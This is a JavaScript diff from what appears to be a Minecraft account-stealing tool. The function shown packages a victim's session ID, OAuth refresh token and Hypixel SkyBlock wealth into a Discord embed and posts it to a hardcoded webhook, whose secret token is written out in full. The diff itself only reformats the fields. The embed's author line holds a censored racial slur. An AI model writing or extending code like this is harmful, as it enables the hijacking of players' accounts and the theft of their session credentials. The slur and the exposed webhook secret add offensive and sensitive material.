@@ -75,28 +75,29 @@ const getInfo = async (res) => {
 const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
   const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1231697682213503046/sp-6jahMB16cWKMauwQtC9Yoafx5Q831Mn_xutVOQfO7WHtCOOTSTnBbJUXSh8ecNAqk' });
 
-  avgSkillLvl = '```' + Math.floor(firstProfileData.data.average_level) + '```'
-  purse = '```' +  Math.floor(firstProfileData.data.purse).toLocaleString('en-US', { style: 'decimal' }) + '```'
-  SBLevel = '```' +  Math.floor(firstProfileData.data.skyblock_level.level) + '```'
-  networth = '```' +  Math.floor(firstProfileData.data.networth.networth).toLocaleString('en-US', { style: 'decimal' }) + '```'
-  uNetworth = '```' +  Math.floor(firstProfileData.data.networth.unsoulboundNetworth).toLocaleString('en-US', { style: 'decimal' }) + '```'
-  minionSlots = '```' +  Math.floor(firstProfileData.data.minion_slots.currentSlots) + '```'
+  const networth = Math.floor(firstProfileData.data.networth.networth).toLocaleString('en-US', { style: 'decimal' });
+  const uNetworth = Math.floor(firstProfileData.data.networth.unsoulboundNetworth).toLocaleString('en-US', { style: 'decimal' });
+  const avgSkillLvl = Math.floor(firstProfileData.data.average_level);
+  const SBLevel = Math.floor(firstProfileData.data.skyblock_level.level);
+  const minionSlots = Math.floor(firstProfileData.data.minion_slots.currentSlots);
+  const purse = Math.floor(firstProfileData.data.purse).toLocaleString('en-US', { style: 'decimal' });
 
   const embed = new EmbedBuilder()
-  .setColor(0x5D3FD3)
-  .setTitle(name)
-  .setURL('https://sky.shiiyu.moe/stats/' + name)
-  .setThumbnail('https://crafatar.com/avatars/' + id)
-  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://oauth2-0-ax54.onrender.com/refresh?refreshToken=' + refresh })
-  .addFields(
-    { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
-    { name: ' ', value: ' ' },
-    { name: 'Average Skill Lvl', value: avgSkillLvl, inline: true }, { name: 'SB Level', value: SBLevel, inline: true },
-    { name: ' ', value: ' ' },
-    { name: 'Minion Slots', value: minionSlots, inline: true }, { name: 'Purse', value: purse, inline: true },
-    { name: 'SSID: ', value: SSIDCode },
-  )
-  .setTimestamp()
+    .setColor(0x5D3FD3)
+    .setTitle(name)
+    .setURL('https://sky.shiiyu.moe/stats/' + name)
+    .setThumbnail('https://crafatar.com/avatars/' + id)
+    .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://oauth2-0-ax54.onrender.com/refresh?refreshToken=' + refresh })
+    .addFields(
+      { name: 'Network', value: '```' + networth + '```' },
+      { name: 'Unsoulbound', value: '```' + uNetworth + '```' },
+      { name: 'Average Skill Lvl', value: '```' + avgSkillLvl + '```' },
+      { name: 'SB Level', value: '```' + SBLevel + '```' },
+      { name: 'Minion Slots', value: '```' + minionSlots + '```' },
+      { name: 'Purse', value: '```' + purse + '```' },
+      { name: 'SSID', value: SSIDCode }
+    )
+    .setTimestamp();
 
   webhookClient.send({
     content: '@everyone',
